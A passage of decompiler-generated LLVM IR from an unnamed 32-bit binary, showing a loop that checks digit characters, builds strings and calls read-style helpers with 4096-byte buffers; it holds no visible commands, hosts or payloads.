dec_label_pc_804d871:                             ; preds = %dec_label_pc_804d859
  %v1_804d871 = add i32 %v0_804d866, 20
  %v2_804d871 = inttoptr i32 %v1_804d871 to i32*
  %v3_804d871 = load i32, i32* %v2_804d871, align 4
  %v1_804d875 = icmp eq i32 %v3_804d871, 0
  %v1_804d877 = icmp eq i1 %v1_804d875, false
  br i1 %v1_804d877, label %dec_label_pc_804db62, label %dec_label_pc_804d87d

dec_label_pc_804d87d:                             ; preds = %dec_label_pc_804d871
  %v1_804d87d = add i32 %v0_804d861, 11
  store i32 %v1_804d87d, i32* @edi, align 4
  %v2_804d880 = inttoptr i32 %v1_804d87d to i8*
  %v3_804d880 = load i8, i8* %v2_804d880, align 1
  %v4_804d880 = zext i8 %v3_804d880 to i32
  %v6_804d880 = and i32 %v0_804d861, -256
  %v7_804d880 = or i32 %v4_804d880, %v6_804d880
  %v1_804d883 = add i32 %v7_804d880, -48
  %v8_804d883 = trunc i32 %v1_804d883 to i8
  store i32 %v1_804d883, i32* %eax.global-to-local, align 4
  %v8_804d888 = icmp ugt i8 %v8_804d883, 9
  br i1 %v8_804d888, label %dec_label_pc_804d859, label %dec_label_pc_804d88a

dec_label_pc_804d88a:                             ; preds = %dec_label_pc_804d87d
  %v2_804d88a = add i32 %v0_804d866, 12
  %v3_804d88a = inttoptr i32 %v2_804d88a to i32*
  store i32 %v1_804d883, i32* %v3_804d88a, align 4
  %v0_804d88b = load i32, i32* %eax.global-to-local, align 4
  %v2_804d88b = add i32 %v0_804d866, 8
  %v3_804d88b = inttoptr i32 %v2_804d88b to i32*
  store i32 %v0_804d88b, i32* %v3_804d88b, align 4
  %v1_804d88c = add i32 %v0_804d866, 4
  %v2_804d88c = inttoptr i32 %v1_804d88c to i32*
  store i32 0, i32* %v2_804d88c, align 4
  %v2_804d88e = inttoptr i32 %v0_804d866 to i32*
  store i32 6, i32* %v2_804d88e, align 4
  %v3_804d890 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804d890, i32* %eax.global-to-local, align 4
  %v0_804d895 = load i32, i32* @esp, align 4
  %v1_804d895 = inttoptr i32 %v0_804d895 to i32*
  %v3_804d895 = add i32 %v0_804d895, 4
  %v1_804d896 = inttoptr i32 %v3_804d895 to i32*
  store i32 %v3_804d890, i32* %v1_804d896, align 4
  %v1_804d898 = add i32 %v0_804d895, 4139
  store i32 %v1_804d898, i32* %eax.global-to-local, align 4
  store i32 %v1_804d898, i32* %v1_804d895, align 4
  %v3_804d8a0 = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8a0, i32* %eax.global-to-local, align 4
  %v0_804d8a5 = load i32, i32* @esp, align 4
  %v1_804d8a5 = inttoptr i32 %v0_804d8a5 to i32*
  %v2_804d8a5 = load i32, i32* %v1_804d8a5, align 4
  store i32 %v2_804d8a5, i32* @ebx, align 4
  %v1_804d8a6 = add i32 %v0_804d8a5, 4139
  store i32 %v1_804d8a6, i32* %edx.global-to-local, align 4
  store i32 %v1_804d8a6, i32* %v1_804d8a5, align 4
  %v2_804d8ae = call i32 @function_8051c40(i8* null)
  store i32 %v2_804d8ae, i32* %eax.global-to-local, align 4
  %v0_804d8b3 = load i32, i32* @esp, align 4
  %v1_804d8b3 = inttoptr i32 %v0_804d8b3 to i32*
  %v2_804d8b3 = load i32, i32* %v1_804d8b3, align 4
  store i32 %v2_804d8b3, i32* %edx.global-to-local, align 4
  %v3_804d8b3 = add i32 %v0_804d8b3, 4
  %v1_804d8b4 = inttoptr i32 %v3_804d8b3 to i32*
  %v0_804d8b5 = load i32, i32* @edi, align 4
  store i32 %v0_804d8b5, i32* %v1_804d8b4, align 4
  %v1_804d8b6 = add i32 %v0_804d8b3, 4139
  store i32 %v1_804d8b6, i32* %edx.global-to-local, align 4
  %v2_804d8bd = add i32 %v1_804d8b6, %v2_804d8ae
  store i32 %v2_804d8bd, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8bd, i32* %v1_804d8b3, align 4
  %v3_804d8c1 = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8c1, i32* %eax.global-to-local, align 4
  %v0_804d8c6 = load i32, i32* @esp, align 4
  %v1_804d8c6 = inttoptr i32 %v0_804d8c6 to i32*
  %v2_804d8c6 = load i32, i32* %v1_804d8c6, align 4
  store i32 %v2_804d8c6, i32* @ebp, align 4
  %v3_804d8c6 = add i32 %v0_804d8c6, 4
  %v1_804d8c7 = inttoptr i32 %v3_804d8c6 to i32*
  %v2_804d8c7 = load i32, i32* %v1_804d8c7, align 4
  store i32 %v2_804d8c7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d8c7, align 4
  store i32 7, i32* %v1_804d8c6, align 4
  %v3_804d8cc = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804d8cc, i32* %eax.global-to-local, align 4
  %v0_804d8d1 = load i32, i32* @esp, align 4
  %v1_804d8d1 = inttoptr i32 %v0_804d8d1 to i32*
  %v2_804d8d1 = load i32, i32* %v1_804d8d1, align 4
  store i32 %v2_804d8d1, i32* @esi, align 4
  store i32 %v3_804d8cc, i32* @ebx, align 4
  %v1_804d8d4 = add i32 %v0_804d8d1, 4139
  store i32 %v1_804d8d4, i32* %eax.global-to-local, align 4
  store i32 %v1_804d8d4, i32* %v1_804d8d1, align 4
  %v2_804d8dc = call i32 @function_8051c40(i8* null)
  store i32 %v2_804d8dc, i32* %eax.global-to-local, align 4
  %v0_804d8e1 = load i32, i32* @esp, align 4
  %v1_804d8e1 = inttoptr i32 %v0_804d8e1 to i32*
  %v2_804d8e1 = load i32, i32* %v1_804d8e1, align 4
  store i32 %v2_804d8e1, i32* %edx.global-to-local, align 4
  %v3_804d8e1 = add i32 %v0_804d8e1, 4
  %v1_804d8e2 = inttoptr i32 %v3_804d8e1 to i32*
  %v0_804d8e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8e3, i32* %v1_804d8e2, align 4
  %v1_804d8e4 = add i32 %v0_804d8e1, 4139
  store i32 %v1_804d8e4, i32* %edx.global-to-local, align 4
  %v2_804d8eb = add i32 %v1_804d8e4, %v2_804d8dc
  store i32 %v2_804d8eb, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8eb, i32* %v1_804d8e1, align 4
  %v3_804d8ef = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d8f4 = load i32, i32* @esp, align 4
  %v1_804d8f7 = add i32 %v0_804d8f4, 8
  %v2_804d8f7 = inttoptr i32 %v1_804d8f7 to i32*
  store i32 4096, i32* %v2_804d8f7, align 4
  %v1_804d8fc = add i32 %v0_804d8f4, 43
  store i32 %v1_804d8fc, i32* %eax.global-to-local, align 4
  %v2_804d900 = add i32 %v0_804d8f4, 4
  %v3_804d900 = inttoptr i32 %v2_804d900 to i32*
  store i32 %v1_804d8fc, i32* %v3_804d900, align 4
  %v1_804d901 = add i32 %v0_804d8f4, 4139
  store i32 %v1_804d901, i32* %edx.global-to-local, align 4
  %v3_804d908 = inttoptr i32 %v0_804d8f4 to i32*
  store i32 %v1_804d901, i32* %v3_804d908, align 4
  %v4_804d909 = call i32 @function_80523b2(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d90e = load i32, i32* @esp, align 4
  %v1_804d90e = add i32 %v0_804d90e, 16
  %v1_804d911 = add i32 %v4_804d909, 1
  %v8_804d911 = icmp eq i32 %v1_804d911, 0
  store i32 %v1_804d911, i32* %eax.global-to-local, align 4
  br i1 %v8_804d911, label %dec_label_pc_804d859, label %dec_label_pc_804d918

dec_label_pc_804d918:                             ; preds = %dec_label_pc_804d88a
  %v2_804d918 = add i32 %v0_804d90e, 12
  %v3_804d918 = inttoptr i32 %v2_804d918 to i32*
  store i32 %v1_804d911, i32* %v3_804d918, align 4
  %v0_804d919 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d919 = add i32 %v0_804d90e, 8
  %v3_804d919 = inttoptr i32 %v2_804d919 to i32*
  store i32 %v0_804d919, i32* %v3_804d919, align 4
  %v1_804d91a = add i32 %v0_804d90e, 4
  %v2_804d91a = inttoptr i32 %v1_804d91a to i32*
  store i32 0, i32* %v2_804d91a, align 4
  %v2_804d91c = inttoptr i32 %v0_804d90e to i32*
  store i32 6, i32* %v2_804d91c, align 4
  %v3_804d91e = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804d91e, i32* %eax.global-to-local, align 4
  %v0_804d923 = load i32, i32* @esp, align 4
  %v1_804d923 = inttoptr i32 %v0_804d923 to i32*
  %v3_804d923 = add i32 %v0_804d923, 4
  %v1_804d924 = inttoptr i32 %v3_804d923 to i32*
  store i32 %v3_804d91e, i32* %v1_804d924, align 4
  %v1_804d926 = add i32 %v0_804d923, 4139
  store i32 %v1_804d926, i32* %eax.global-to-local, align 4
  store i32 %v1_804d926, i32* %v1_804d923, align 4
  %v3_804d92e = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d92e, i32* %eax.global-to-local, align 4
  %v0_804d933 = load i32, i32* @esp, align 4
  %v1_804d933 = inttoptr i32 %v0_804d933 to i32*
  %v2_804d933 = load i32, i32* %v1_804d933, align 4
  store i32 %v2_804d933, i32* @ebx, align 4
  %v1_804d934 = add i32 %v0_804d933, 4139
  store i32 %v1_804d934, i32* %edx.global-to-local, align 4
  store i32 %v1_804d934, i32* %v1_804d933, align 4
  %v2_804d93c = call i32 @function_8051c40(i8* null)
  store i32 %v2_804d93c, i32* %eax.global-to-local, align 4
  %v0_804d941 = load i32, i32* @esp, align 4
  %v1_804d941 = inttoptr i32 %v0_804d941 to i32*
  %v2_804d941 = load i32, i32* %v1_804d941, align 4
  store i32 %v2_804d941, i32* %edx.global-to-local, align 4
  %v3_804d941 = add i32 %v0_804d941, 4
  %v1_804d942 = inttoptr i32 %v3_804d941 to i32*
  %v0_804d943 = load i32, i32* @edi, align 4
  store i32 %v0_804d943, i32* %v1_804d942, align 4
  %v1_804d944 = add i32 %v0_804d941, 4139
  store i32 %v1_804d944, i32* %edx.global-to-local, align 4
  %v2_804d94b = add i32 %v1_804d944, %v2_804d93c
  store i32 %v2_804d94b, i32* %eax.global-to-local, align 4
  store i32 %v2_804d94b, i32* %v1_804d941, align 4
  %v3_804d94f = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d94f, i32* %eax.global-to-local, align 4
  %v0_804d954 = load i32, i32* @esp, align 4
  %v1_804d954 = inttoptr i32 %v0_804d954 to i32*
  %v2_804d954 = load i32, i32* %v1_804d954, align 4
  store i32 %v2_804d954, i32* @ebp, align 4
  %v3_804d954 = add i32 %v0_804d954, 4
  %v1_804d955 = inttoptr i32 %v3_804d954 to i32*
  %v2_804d955 = load i32, i32* %v1_804d955, align 4
  store i32 %v2_804d955, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d955, align 4
  store i32 9, i32* %v1_804d954, align 4
  %v3_804d95a = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804d95a, i32* %eax.global-to-local, align 4
  %v0_804d95f = load i32, i32* @esp, align 4
  %v1_804d95f = inttoptr i32 %v0_804d95f to i32*
  %v2_804d95f = load i32, i32* %v1_804d95f, align 4
  store i32 %v2_804d95f, i32* @esi, align 4
  store i32 %v3_804d95a, i32* @ebx, align 4
  %v1_804d962 = add i32 %v0_804d95f, 4139
  store i32 %v1_804d962, i32* %eax.global-to-local, align 4
  store i32 %v1_804d962, i32* %v1_804d95f, align 4
  %v2_804d96a = call i32 @function_8051c40(i8* null)
  store i32 %v2_804d96a, i32* %eax.global-to-local, align 4
  %v0_804d96f = load i32, i32* @esp, align 4
  %v1_804d96f = inttoptr i32 %v0_804d96f to i32*
  %v2_804d96f = load i32, i32* %v1_804d96f, align 4
  store i32 %v2_804d96f, i32* %edx.global-to-local, align 4
  %v3_804d96f = add i32 %v0_804d96f, 4
  %v1_804d970 = inttoptr i32 %v3_804d96f to i32*
  %v0_804d971 = load i32, i32* @ebx, align 4
  store i32 %v0_804d971, i32* %v1_804d970, align 4
  %v1_804d972 = add i32 %v0_804d96f, 4139
  store i32 %v1_804d972, i32* %edx.global-to-local, align 4
  %v2_804d979 = add i32 %v1_804d972, %v2_804d96a
  store i32 %v2_804d979, i32* %eax.global-to-local, align 4
  store i32 %v2_804d979, i32* %v1_804d96f, align 4
  %v3_804d97d = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d982 = load i32, i32* @esp, align 4
  %v1_804d982 = inttoptr i32 %v0_804d982 to i32*
  %v1_804d983 = add i32 %v0_804d982, 4139
  store i32 %v1_804d983, i32* %eax.global-to-local, align 4
  store i32 %v1_804d983, i32* %v1_804d982, align 4
  %v1_804d98b = call i32 @function_80525a4(i32 0)
  store i32 %v1_804d98b, i32* %eax.global-to-local, align 4
  %v0_804d990 = load i32, i32* @esp, align 4
  %v1_804d990 = add i32 %v0_804d990, 16
  store i32 %v1_804d98b, i32* @ebp, align 4
  %v1_804d995 = icmp eq i32 %v1_804d98b, 0
  br i1 %v1_804d995, label %dec_label_pc_804d859, label %dec_label_pc_804d99d.preheader

dec_label_pc_804d99d.preheader:                   ; preds = %dec_label_pc_804d918
  %v3_804d9a083 = inttoptr i32 %v0_804d990 to i32*
  store i32 %v1_804d98b, i32* %v3_804d9a083, align 4
  %v0_804d9a184 = call i32 @function_8052695()
  store i32 %v0_804d9a184, i32* @eax, align 4
  %v0_804d9a685 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a184, i32* @esi, align 4
  %v1_804d9ab87 = icmp eq i32 %v0_804d9a184, 0
  br i1 %v1_804d9ab87, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804d9b3:                             ; preds = %dec_label_pc_804d99d.preheader, %dec_label_pc_804d99d.backedge
  %v0_804d9a688 = phi i32 [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ], [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ]
  %v1_804d9b3 = add i32 %v0_804d9a688, 20
  %v2_804d9b3 = inttoptr i32 %v1_804d9b3 to i32*
  %v3_804d9b3 = load i32, i32* %v2_804d9b3, align 4
  store i32 %v3_804d9b3, i32* @eax, align 4
  %v1_804d9b7 = icmp eq i32 %v3_804d9b3, 0
  %v1_804d9b9 = icmp eq i1 %v1_804d9b7, false
  br i1 %v1_804d9b9, label %dec_label_pc_804dbee, label %dec_label_pc_804d9bf

dec_label_pc_804d9bf:                             ; preds = %dec_label_pc_804d9b3
  %v2_804d9bf = add i32 %v0_804d9a688, 12
  %v3_804d9bf = inttoptr i32 %v2_804d9bf to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9bf, align 4
  %v2_804d9c0 = add i32 %v0_804d9a688, 8
  %v3_804d9c0 = inttoptr i32 %v2_804d9c0 to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9c0, align 4
  %v1_804d9c1 = add i32 %v0_804d9a688, 4
  %v2_804d9c1 = inttoptr i32 %v1_804d9c1 to i32*
  store i32 4096, i32* %v2_804d9c1, align 4
  %v1_804d9c6 = add i32 %v0_804d9a688, 43
  store i32 %v1_804d9c6, i32* %edx.global-to-local, align 4
  %v3_804d9ca = inttoptr i32 %v0_804d9a688 to i32*
  store i32 %v1_804d9c6, i32* %v3_804d9ca, align 4
  %v2_804d9cb = call i32 @function_8051cd0(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d9cb, i32* %eax.global-to-local, align 4
  %v0_804d9d0 = load i32, i32* @esp, align 4
  %v1_804d9d0 = inttoptr i32 %v0_804d9d0 to i32*
  %v2_804d9d0 = load i32, i32* %v1_804d9d0, align 4
  store i32 %v2_804d9d0, i32* @ebx, align 4
  %v3_804d9d0 = add i32 %v0_804d9d0, 4
  %v1_804d9d1 = inttoptr i32 %v3_804d9d0 to i32*
  %v2_804d9d1 = load i32, i32* %v1_804d9d1, align 4
  store i32 %v2_804d9d1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d9d1, align 4
  store i32 6, i32* %v1_804d9d0, align 4
  %v3_804d9d6 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804d9d6, i32* %eax.global-to-local, align 4
  %v0_804d9db = load i32, i32* @esp, align 4
  %v1_804d9db = inttoptr i32 %v0_804d9db to i32*
  %v2_804d9db = load i32, i32* %v1_804d9db, align 4
  store i32 %v2_804d9db, i32* %edx.global-to-local, align 4
  %v3_804d9db = add i32 %v0_804d9db, 4
  %v1_804d9dc = inttoptr i32 %v3_804d9db to i32*
  store i32 %v3_804d9d6, i32* %v1_804d9dc, align 4
  %v1_804d9de = add i32 %v0_804d9db, 4139
  store i32 %v1_804d9de, i32* %eax.global-to-local, align 4
  store i32 %v1_804d9de, i32* %v1_804d9db, align 4
  %v3_804d9e6 = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d9e6, i32* %eax.global-to-local, align 4
  %v0_804d9eb = load i32, i32* @esp, align 4
  %v1_804d9eb = inttoptr i32 %v0_804d9eb to i32*
  %v2_804d9eb = load i32, i32* %v1_804d9eb, align 4
  store i32 %v2_804d9eb, i32* %eax.global-to-local, align 4
  %v1_804d9ec = add i32 %v0_804d9eb, 4139
  store i32 %v1_804d9ec, i32* %edx.global-to-local, align 4
  store i32 %v1_804d9ec, i32* %v1_804d9eb, align 4
  %v2_804d9f4 = call i32 @function_8051c40(i8* null)
  store i32 %v2_804d9f4, i32* %eax.global-to-local, align 4
  %v0_804d9f9 = load i32, i32* @esp, align 4
  %v1_804d9f9 = inttoptr i32 %v0_804d9f9 to i32*
  %v3_804d9f9 = add i32 %v0_804d9f9, 4
  %v1_804d9fa = inttoptr i32 %v3_804d9f9 to i32*
  %v2_804d9fa = load i32, i32* %v1_804d9fa, align 4
  store i32 %v2_804d9fa, i32* @ebx, align 4
  %v0_804d9fb = load i32, i32* @edi, align 4
  store i32 %v0_804d9fb, i32* %v1_804d9fa, align 4
  %v1_804d9fc = add i32 %v0_804d9f9, 4139
  store i32 %v1_804d9fc, i32* %edx.global-to-local, align 4
  %v2_804da03 = add i32 %v1_804d9fc, %v2_804d9f4
  store i32 %v2_804da03, i32* %eax.global-to-local, align 4
  store i32 %v2_804da03, i32* %v1_804d9f9, align 4
  %v3_804da07 = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da07, i32* %eax.global-to-local, align 4
  %v0_804da0c = load i32, i32* @esp, align 4
  %v1_804da0c = inttoptr i32 %v0_804da0c to i32*
  %v2_804da0c = load i32, i32* %v1_804da0c, align 4
  store i32 %v2_804da0c, i32* %eax.global-to-local, align 4
  %v3_804da0c = add i32 %v0_804da0c, 4
  %v1_804da0d = inttoptr i32 %v3_804da0c to i32*
  %v2_804da0d = load i32, i32* %v1_804da0d, align 4
  store i32 %v2_804da0d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804da0d, align 4
  store i32 9, i32* %v1_804da0c, align 4
  %v3_804da12 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804da12, i32* @ebx, align 4
  %v0_804da19 = load i32, i32* @esp, align 4
  %v1_804da19 = inttoptr i32 %v0_804da19 to i32*
  %v1_804da1a = add i32 %v0_804da19, 4139
  store i32 %v1_804da1a, i32* %eax.global-to-local, align 4
  store i32 %v1_804da1a, i32* %v1_804da19, align 4
  %v2_804da22 = call i32 @function_8051c40(i8* null)
  store i32 %v2_804da22, i32* %eax.global-to-local, align 4
  %v0_804da27 = load i32, i32* @esp, align 4
  %v1_804da27 = inttoptr i32 %v0_804da27 to i32*
  %v2_804da27 = load i32, i32* %v1_804da27, align 4
  store i32 %v2_804da27, i32* %edx.global-to-local, align 4
  %v3_804da27 = add i32 %v0_804da27, 4
  %v1_804da28 = inttoptr i32 %v3_804da27 to i32*
  %v0_804da29 = load i32, i32* @ebx, align 4
  store i32 %v0_804da29, i32* %v1_804da28, align 4
  %v1_804da2a = add i32 %v0_804da27, 4139
  store i32 %v1_804da2a, i32* %edx.global-to-local, align 4
  %v2_804da31 = add i32 %v1_804da2a, %v2_804da22
  store i32 %v2_804da31, i32* %eax.global-to-local, align 4
  store i32 %v2_804da31, i32* %v1_804da27, align 4
  %v3_804da35 = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da35, i32* %eax.global-to-local, align 4
  %v0_804da3a = load i32, i32* @esp, align 4
  %v1_804da3a = inttoptr i32 %v0_804da3a to i32*
  %v2_804da3a = load i32, i32* %v1_804da3a, align 4
  store i32 %v2_804da3a, i32* @ebx, align 4
  %v1_804da3b = add i32 %v0_804da3a, 4139
  store i32 %v1_804da3b, i32* %eax.global-to-local, align 4
  store i32 %v1_804da3b, i32* %v1_804da3a, align 4
  %v2_804da43 = call i32 @function_8051c40(i8* null)
  store i32 %v2_804da43, i32* %eax.global-to-local, align 4
  %v0_804da48 = load i32, i32* @esp, align 4
  %v1_804da48 = inttoptr i32 %v0_804da48 to i32*
  %v2_804da48 = load i32, i32* %v1_804da48, align 4
  store i32 %v2_804da48, i32* %edx.global-to-local, align 4
  %v3_804da48 = add i32 %v0_804da48, 4
  %v1_804da49 = inttoptr i32 %v3_804da48 to i32*
  store i32 ptrtoint (i32* @global_var_8054acd.6 to i32), i32* %v1_804da49, align 4
  %v1_804da4f = add i32 %v0_804da48, 4139
  store i32 %v1_804da4f, i32* %edx.global-to-local, align 4
  %v2_804da56 = add i32 %v1_804da4f, %v2_804da43
  store i32 %v2_804da56, i32* %eax.global-to-local, align 4
  store i32 %v2_804da56, i32* %v1_804da48, align 4
  %v3_804da5a = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da5a, i32* %eax.global-to-local, align 4
  %v0_804da5f = load i32, i32* @esp, align 4
  %v1_804da5f = inttoptr i32 %v0_804da5f to i32*
  %v2_804da5f = load i32, i32* %v1_804da5f, align 4
  store i32 %v2_804da5f, i32* @ebx, align 4
  %v1_804da60 = add i32 %v0_804da5f, 4139
  store i32 %v1_804da60, i32* %eax.global-to-local, align 4
  store i32 %v1_804da60, i32* %v1_804da5f, align 4
  %v2_804da68 = call i32 @function_8051c40(i8* null)
  store i32 %v2_804da68, i32* %eax.global-to-local, align 4
  %v0_804da6d = load i32, i32* @esp, align 4
  %v1_804da6d = inttoptr i32 %v0_804da6d to i32*
  %v3_804da6d = add i32 %v0_804da6d, 4
  %v0_804da6e = load i32, i32* @esi, align 4
  %v1_804da6e = add i32 %v0_804da6e, 11
  store i32 %v1_804da6e, i32* %edx.global-to-local, align 4
  %v1_804da71 = inttoptr i32 %v3_804da6d to i32*
  store i32 %v1_804da6e, i32* %v1_804da71, align 4
  %v1_804da73 = add i32 %v0_804da6d, 4139
  store i32 %v1_804da73, i32* %edx.global-to-local, align 4
  %v2_804da7a = add i32 %v1_804da73, %v2_804da68
  store i32 %v2_804da7a, i32* %eax.global-to-local, align 4
  store i32 %v2_804da7a, i32* %v1_804da6d, align 4
  %v3_804da7e = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804da83 = load i32, i32* @esp, align 4
  %v1_804da86 = add i32 %v0_804da83, 8
  %v2_804da86 = inttoptr i32 %v1_804da86 to i32*
  store i32 4096, i32* %v2_804da86, align 4
  %v1_804da8b = add i32 %v0_804da83, 43
  store i32 %v1_804da8b, i32* %eax.global-to-local, align 4
  %v2_804da8f = add i32 %v0_804da83, 4
  %v3_804da8f = inttoptr i32 %v2_804da8f to i32*
  store i32 %v1_804da8b, i32* %v3_804da8f, align 4
  %v1_804da90 = add i32 %v0_804da83, 4139
  store i32 %v1_804da90, i32* %edx.global-to-local, align 4
  %v3_804da97 = inttoptr i32 %v0_804da83 to i32*
  store i32 %v1_804da90, i32* %v3_804da97, align 4
  %v4_804da98 = call i32 @function_80523b2(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804da9d = load i32, i32* @esp, align 4
  %v1_804daa0 = add i32 %v4_804da98, 1
  %v8_804daa0 = icmp eq i32 %v1_804daa0, 0
  store i32 %v1_804daa0, i32* %eax.global-to-local, align 4
  br i1 %v8_804daa0, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804daa7

dec_label_pc_804daa7:                             ; preds = %dec_label_pc_804d9bf
  %v1_804daaa = add i32 %v0_804da9d, 43
  store i32 %v1_804daaa, i32* %eax.global-to-local, align 4
  %v3_804daae = inttoptr i32 %v0_804da9d to i32*
  store i32 %v1_804daaa, i32* %v3_804daae, align 4
  %v2_804daaf = call i32 @function_8051c40(i8* null)
  %v0_804dab4 = load i32, i32* @esp, align 4
  %v1_804dab7 = add i32 %v0_804dab4, 8764
  store i32 %v1_804dab7, i32* @edx, align 4
  %v2_804dabe = add i32 %v0_804dab4, 8
  %v3_804dabe = inttoptr i32 %v2_804dabe to i32*
  store i32 %v1_804dab7, i32* %v3_804dabe, align 4
  %v2_804dabf = add i32 %v0_804dab4, 4
  %v3_804dabf = inttoptr i32 %v2_804dabf to i32*
  store i32 %v2_804daaf, i32* %v3_804dabf, align 4
  %v1_804dac0 = add i32 %v0_804dab4, 43
  store i32 %v1_804dac0, i32* %eax.global-to-local, align 4
  %v3_804dac4 = inttoptr i32 %v0_804dab4 to i32*
  store i32 %v1_804dac0, i32* %v3_804dac4, align 4
  %v4_804dac5 = call i32 @function_8051f30(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804daca = load i32, i32* @esp, align 4
  %v1_804dacd = add i32 %v4_804dac5, 1
  %v8_804dacd = icmp eq i32 %v1_804dacd, 0
  store i32 %v1_804dacd, i32* %eax.global-to-local, align 4
  br i1 %v8_804dacd, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804dad4

dec_label_pc_804dad4:                             ; preds = %dec_label_pc_804daa7
  %v0_804dad4 = load i32, i32* @ebx, align 4
  %v2_804dad4 = add i32 %v0_804daca, 12
  %v3_804dad4 = inttoptr i32 %v2_804dad4 to i32*
  store i32 %v0_804dad4, i32* %v3_804dad4, align 4
  %v0_804dad5 = load i32, i32* @ebx, align 4
  %v2_804dad5 = add i32 %v0_804daca, 8
  %v3_804dad5 = inttoptr i32 %v2_804dad5 to i32*
  store i32 %v0_804dad5, i32* %v3_804dad5, align 4
  %v1_804dad6 = add i32 %v0_804daca, 4
  %v2_804dad6 = inttoptr i32 %v1_804dad6 to i32*
  store i32 10, i32* %v2_804dad6, align 4
  %v0_804dad8 = load i32, i32* @edi, align 4
  %v3_804dad8 = inttoptr i32 %v0_804daca to i32*
  store i32 %v0_804dad8, i32* %v3_804dad8, align 4
  %v3_804dad9 = call i32 @function_8051d40(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804dad9, i32* %eax.global-to-local, align 4
  %v0_804dade = load i32, i32* @esp, align 4
  %v1_804dade = inttoptr i32 %v0_804dade to i32*
  %v2_804dade = load i32, i32* %v1_804dade, align 4
  store i32 %v2_804dade, i32* %edx.global-to-local, align 4
  %v3_804dade = add i32 %v0_804dade, 4
  %v1_804dadf = inttoptr i32 %v3_804dade to i32*
  store i32 9, i32* %v1_804dadf, align 4
  store i32 %v3_804dad9, i32* %v1_804dade, align 4
  %v4_804dae3 = call i32 @function_80522c0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dae3, i32* %eax.global-to-local, align 4
  %v0_804dae8 = load i32, i32* @esp, align 4
  %v1_804dae8 = add i32 %v0_804dae8, 20
  %v2_804dae8 = inttoptr i32 %v1_804dae8 to i32*
  store i32 1, i32* %v2_804dae8, align 4
  %v0_804daf0 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d99d.backedge

dec_label_pc_804d99d.backedge:                    ; preds = %dec_label_pc_804dad4, %dec_label_pc_804d9bf, %dec_label_pc_804daa7
  %v0_804d99d42.in = phi i32 [ %v0_804daf0, %dec_label_pc_804dad4 ], [ %v0_804da9d, %dec_label_pc_804d9bf ], [ %v0_804daca, %dec_label_pc_804daa7 ]
  %v0_804d9a0.pre = load i32, i32* @ebp, align 4
  %v3_804d9a0 = inttoptr i32 %v0_804d99d42.in to i32*
  store i32 %v0_804d9a0.pre, i32* %v3_804d9a0, align 4
  %v0_804d9a1 = call i32 @function_8052695()
  store i32 %v0_804d9a1, i32* @eax, align 4
  %v0_804d9a6 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a1, i32* @esi, align 4
  %v1_804d9ab = icmp eq i32 %v0_804d9a1, 0
  br i1 %v1_804d9ab, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804daf8:                             ; preds = %dec_label_pc_804d79b
  %v1_804daf8 = add i32 %v0_804daf8, 1
  store i32 %v1_804daf8, i32* @esi, align 4
  %v9_804daf9 = icmp eq i32 %v0_804daf8, 0
  %v1_804dafc = icmp eq i1 %v9_804daf9, false
  br i1 %v1_804dafc, label %dec_label_pc_804d7a3, label %dec_label_pc_804db02

dec_label_pc_804db02:                             ; preds = %dec_label_pc_804daf8
  %v1_804db02 = add i32 %v0_804d7a5, 3
  %v2_804db02 = inttoptr i32 %v1_804db02 to i8*
  %v3_804db02 = load i8, i8* %v2_804db02, align 1
  %v12_804db02 = icmp eq i8 %v3_804db02, 65
  %.stack_var_-8769.1 = select i1 %v12_804db02, i8 1, i8 %stack_var_-8769.1.ph
  %v1_804db08 = add i32 %v0_804d7a5, 1
